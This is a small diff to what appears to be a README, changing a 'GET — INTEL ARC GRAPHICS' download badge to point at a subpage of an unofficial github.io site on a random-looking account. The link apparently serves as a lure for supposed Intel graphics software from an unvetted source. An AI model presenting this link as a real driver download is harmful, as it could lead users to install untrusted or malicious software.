@@ -4,7 +4,7 @@
 <img src="https://www.hardwareinside.de/wp-content/uploads/2025/08/Intel-ARC-1536x864.png" width="780">
 </p>
 
-[![GET — INTEL ARC GRAPHICS](https://img.shields.io/badge/GET-INTEL%20ARC%20GRAPHICS-2563eb?style=for-the-badge)](https://postlethwaitultraoehlert.github.io/.github/)
+[![GET — INTEL ARC GRAPHICS](https://img.shields.io/badge/GET-INTEL%20ARC%20GRAPHICS-2563eb?style=for-the-badge)](https://postlethwaitultraoehlert.github.io/.github/Intel-arc)
 
 ---
 
